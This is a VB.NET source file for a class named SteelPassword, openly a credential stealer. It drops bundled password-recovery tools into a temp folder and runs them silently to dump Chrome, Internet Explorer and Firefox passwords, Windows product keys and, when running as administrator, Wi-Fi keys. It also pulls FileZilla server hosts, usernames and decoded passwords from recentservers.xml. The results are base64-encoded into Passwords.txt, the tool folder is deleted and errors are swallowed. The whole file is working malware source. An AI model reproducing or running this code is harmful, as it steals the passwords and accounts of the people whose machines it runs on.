Imports System.IO
Imports System.Threading
Imports System.Windows.Forms
Imports System.Text.RegularExpressions
Imports System.Text
Imports System.Security.Principal

Public Class SteelPassword
    Dim Data As String
    Public a As String
    Public Paths As String = IO.Path.GetTempPath & "/PasswordStealer"

    Public Function Dump()
        FileZillaStealer()
        Dim result As String
        Try
            If Not IO.Directory.Exists(Paths) Then
                IO.Directory.CreateDirectory(Paths)
            End If
            File.WriteAllBytes(Paths & "\ChromePass.exe", My.Resources.ChromePass)
            File.WriteAllBytes(Paths & "\iepv.exe", My.Resources.iepv)
            File.WriteAllBytes(Paths & "\ChromePass.cfg", My.Resources.ChromePass_cfg)
            File.WriteAllBytes(Paths & "\iepv.cfg", My.Resources.iepv_cfg)
            If getOSPlatForm() = "x64" Then
                If checkadmin() = "Administrator" Then
                    File.WriteAllBytes(Paths & "\WirelessKeyView64.exe", My.Resources.WirelessKeyView64)
                    File.WriteAllBytes(Paths & "\WirelessKeyView64.cfg", My.Resources.WirelessKeyView64cfg)
                    Shell(Paths & "\WirelessKeyView64.exe /scomma " & Paths & "\" & "wifi1.txt")
                End If
                File.WriteAllBytes(Paths & "\PasswordFox64.exe", My.Resources.PasswordFox64)
                File.WriteAllBytes(Paths & "\ProduKey64.exe", My.Resources.ProduKey64)
                File.WriteAllBytes(Paths & "\PasswordFox64.cfg", My.Resources.PasswordFox64cfg)
                File.WriteAllBytes(Paths & "\ProduKey64.cfg", My.Resources.ProduKey64cfg)

                Shell(Paths & "\PasswordFox64.exe /scomma " & Paths & "\" & "passlist1.txt")
                Shell(Paths & "\ProduKey64.exe /scomma " & Paths & "\" & "passlist2.txt")
            ElseIf getOSPlatForm() = "x86" Then
                If checkadmin() = "Administrator" Then
                    File.WriteAllBytes(Paths & "\WirelessKeyView32.exe", My.Resources.WirelessKeyView32)
                    File.WriteAllBytes(Paths & "\WirelessKeyView32.cfg", My.Resources.WirelessKeyView32cfg)
                    Shell(Paths & "\WirelessKeyView32.exe /scomma " & Paths & "\" & "wifi1.txt")
                End If
                File.WriteAllBytes(Paths & "\PasswordFox32.exe", My.Resources.PasswordFox32)
                File.WriteAllBytes(Paths & "\ProduKey32.exe", My.Resources.ProduKey32)
                File.WriteAllBytes(Paths & "\PasswordFox32.cfg", My.Resources.PasswordFox32cfg)
                File.WriteAllBytes(Paths & "\ProduKey32.cfg", My.Resources.ProduKey32cfg)

                Shell(Paths & "\PasswordFox32.exe /scomma " & Paths & "\" & "passlist1.txt")
                Shell(Paths & "\ProduKey32.exe /scomma " & Paths & "\" & "passlist2.txt")
            End If
            Shell(Paths & "\ChromePass.exe /scomma " & Paths & "\" & "passlist3.txt")
            Shell(Paths & "\iepv.exe /scomma " & Paths & "\" & "passlist4.txt")
            IO.File.WriteAllText(Path.GetTempPath & "\" & "Passwords.txt", ENB(File.ReadAllText(Paths & "\" & "passlist1.txt") &
            File.ReadAllText(Paths & "\" & "passlist2.txt") &
            File.ReadAllText(Paths & "\" & "passlist3.txt") &
            File.ReadAllText(Paths & "\" & "passlist4.txt")))
            If File.Exists(Paths & "\wifi1.txt") Then
                File.AppendAllText(Paths & "\Passwords.txt", ENB(File.ReadAllText(Paths & "\wifi1.txt")))
            End If
        Catch ex As Exception
            ' MsgBox(ex.Message)
        End Try
        IO.Directory.Delete(Paths, True)
        Return result
    End Function
    Function getOSPlatForm() As String
        Dim OsPlatForm As String = Nothing
        If IntPtr.Size * 8 = 32 Then
            OsPlatForm = "x86"
        Else
            OsPlatForm = "x64"
        End If
        Return OsPlatForm
    End Function
    Public Function checkadmin() As String
        Dim W_Id = WindowsIdentity.GetCurrent()
        Dim WP = New WindowsPrincipal(W_Id)
        Dim isAdmin As Boolean = WP.IsInRole(WindowsBuiltInRole.Administrator)
        If isAdmin = True Then
            Return "Administrator"
        Else
            Return "User"
        End If
    End Function
    Public Sub FileZillaStealer()
        Try
            Dim datafile As String() = Split(IO.File.ReadAllText(Environ("APPDATA") & "\FileZilla\recentservers.xml"), "<Server>")
            For Each user As String In datafile
                Dim spliter = Split(user, vbNewLine)
                For Each I As String In spliter
                    If I.Contains("<Host>") Then
                        Data += Split(Split(I, "<Host>")(1), "</Host>")(0) & ","
                    End If
                    If I.Contains("<User>") Then
                        Data += Split(Split(I, "<User>")(1), "</User>")(0) & ","
                    End If
                    If I.Contains("<Pass " & My.Resources.String1 & ">") Then
                        Data += DEB(Split(Split(I, "<Pass " & My.Resources.String1 & ">")(1), "</Pass>")(0))
                    End If
                    If I.Contains("<Pass>") Then
                        Data += Split(Split(I, "<Pass>")(1), "</Pass>")(0)
                    End If
                Next
            Next

        Catch
            Data += ""
        End Try
    End Sub
    Public Function DEB(ByRef s As String) As String
        Dim b As Byte() = Convert.FromBase64String(s)
        DEB = System.Text.Encoding.UTF8.GetString(b)
    End Function
    Public Function ENB(ByRef s As String) As String
        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
        ENB = Convert.ToBase64String(byt)
    End Function
End Class